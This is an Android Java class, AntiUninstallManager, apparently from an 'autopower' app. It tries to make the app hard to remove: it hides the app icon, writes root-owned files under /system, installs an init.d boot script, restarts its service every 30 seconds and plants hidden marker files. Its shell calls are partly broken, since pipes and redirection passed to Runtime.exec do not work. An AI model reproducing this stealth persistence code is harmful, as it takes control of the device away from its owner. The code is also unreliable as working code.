package com.oppo.autopower;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;

import java.io.File;
import java.io.IOException;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class AntiUninstallManager {

    private static final String TAG = "AutoPowerManager";
    private static final long PROTECTION_CHECK_INTERVAL = 30 * 1000; // 30秒检查一次

    private Context mContext;
    private ScheduledExecutorService mExecutorService;

    public AntiUninstallManager(Context context) {
        this.mContext = context;
        this.mExecutorService = Executors.newSingleThreadScheduledExecutor();
    }

    /**
     * 启动保护机制
     */
    public void startProtection() {
        Log.d(TAG, "Starting anti-uninstall protection");

        // 1. 设置应用为系统应用属性
        setAsSystemApp();

        // 2. 创建备份服务
        createBackupService();

        // 3. 隐藏应用图标
        hideAppIcon();

        // 4. 启动保护检查
        startProtectionChecker();

        // 5. 设置自启动权限
        setAutoStartPermission();
    }

    /**
     * 设置为系统应用属性
     */
    private void setAsSystemApp() {
        try {
            // 修改app_process的环境变量
            String cmd = "setprop persist.sys.auto_power_manager.enabled 1";
            Runtime.getRuntime().exec(cmd).waitFor();
            Log.d(TAG, "System app property set");
        } catch (Exception e) {
            Log.e(TAG, "Failed to set system app property", e);
        }
    }

    /**
     * 创建备份服务
     */
    private void createBackupService() {
        try {
            // 创建备份文件
            File backupDir = new File("/system/priv-app/AutoPowerManagerBackup");
            backupDir.mkdirs();

            // 设置权限
            Runtime.getRuntime().exec(new String[]{"chmod", "755", backupDir.getAbsolutePath()});
            Runtime.getRuntime().exec(new String[]{"chown", "root:root", backupDir.getAbsolutePath()});

            Log.d(TAG, "Backup service directory created");
        } catch (Exception e) {
            Log.e(TAG, "Failed to create backup service", e);
        }
    }

    /**
     * 隐藏应用图标
     */
    private void hideAppIcon() {
        try {
            PackageManager pm = mContext.getPackageManager();
            ComponentName componentName = new ComponentName(mContext, MainActivity.class);
            
            pm.setComponentEnabledSetting(componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            
            Log.d(TAG, "App icon hidden");
        } catch (Exception e) {
            Log.e(TAG, "Failed to hide app icon", e);
        }
    }

    /**
     * 启动保护检查
     */
    private void startProtectionChecker() {
        mExecutorService.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                checkProtection();
            }
        }, 0, PROTECTION_CHECK_INTERVAL, TimeUnit.MILLISECONDS);
    }

    /**
     * 检查保护状态
     */
    private void checkProtection() {
        try {
            // 检查服务是否正常运行
            if (!isServiceRunning()) {
                Log.d(TAG, "Service not running, restarting...");
                restartService();
            }

            // 检查配置文件权限
            checkConfigFilePermissions();

            // 检查自启动状态
            if (!isAutoStartEnabled()) {
                setAutoStartPermission();
            }

        } catch (Exception e) {
            Log.e(TAG, "Protection check failed", e);
        }
    }

    /**
     * 检查服务是否运行
     */
    private boolean isServiceRunning() {
        try {
            // 检查进程是否存在
            Process process = Runtime.getRuntime().exec("ps | grep com.oppo.autopower");
            int exitCode = process.waitFor();
            return exitCode == 0;
        } catch (Exception e) {
            Log.e(TAG, "Failed to check service status", e);
            return false;
        }
    }

    /**
     * 重启服务
     */
    private void restartService() {
        try {
            Intent serviceIntent = new Intent(mContext, AutoPowerService.class);
            mContext.startService(serviceIntent);
            Log.d(TAG, "Service restarted");
        } catch (Exception e) {
            Log.e(TAG, "Failed to restart service", e);
        }
    }

    /**
     * 检查配置文件权限
     */
    private void checkConfigFilePermissions() {
        try {
            File configFile = new File("/data/system/autopower_timer_config.prop");
            if (configFile.exists()) {
                Runtime.getRuntime().exec(new String[]{"chmod", "600", configFile.getAbsolutePath()});
                Runtime.getRuntime().exec(new String[]{"chown", "system:system", configFile.getAbsolutePath()});
            }

            File statusFile = new File("/data/system/autopower_service_status.prop");
            if (statusFile.exists()) {
                Runtime.getRuntime().exec(new String[]{"chmod", "600", statusFile.getAbsolutePath()});
                Runtime.getRuntime().exec(new String[]{"chown", "system:system", statusFile.getAbsolutePath()});
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to check config file permissions", e);
        }
    }

    /**
     * 设置自启动权限
     */
    private void setAutoStartPermission() {
        try {
            // 添加到系统启动项
            File initFile = new File("/system/etc/init.d/99_auto_power_manager");
            if (!initFile.exists()) {
                String initScript = "#!/system/bin/sh\n"
                        + "am startservice com.oppo.autopower/.AutoPowerService\n";
                
                Runtime.getRuntime().exec("echo \"" + initScript + "\" > " + initFile.getAbsolutePath());
                Runtime.getRuntime().exec(new String[]{"chmod", "755", initFile.getAbsolutePath()});
                Runtime.getRuntime().exec(new String[]{"chown", "root:root", initFile.getAbsolutePath()});
            }

            Log.d(TAG, "Auto-start permission set");
        } catch (Exception e) {
            Log.e(TAG, "Failed to set auto-start permission", e);
        }
    }

    /**
     * 检查自启动是否已启用
     */
    private boolean isAutoStartEnabled() {
        try {
            File initFile = new File("/system/etc/init.d/99_auto_power_manager");
            return initFile.exists() && initFile.canExecute();
        } catch (Exception e) {
            Log.e(TAG, "Failed to check auto-start status", e);
            return false;
        }
    }

    /**
     * 停止保护机制
     */
    public void stopProtection() {
        mExecutorService.shutdown();
        Log.d(TAG, "Anti-uninstall protection stopped");
    }

    /**
     * 创建安全文件
     */
    public void createSecurityFiles() {
        try {
            // 创建多个安全检查点文件
            String[] securityFiles = {
                "/data/system/.autopower_secure1",
                "/data/.autopower_secure2",
                "/cache/.autopower_secure3"
            };

            for (String filePath : securityFiles) {
                File file = new File(filePath);
                if (!file.exists()) {
                    file.createNewFile();
                    Runtime.getRuntime().exec(new String[]{"chmod", "600", filePath});
                }
            }

            Log.d(TAG, "Security files created");
        } catch (Exception e) {
            Log.e(TAG, "Failed to create security files", e);
        }
    }
}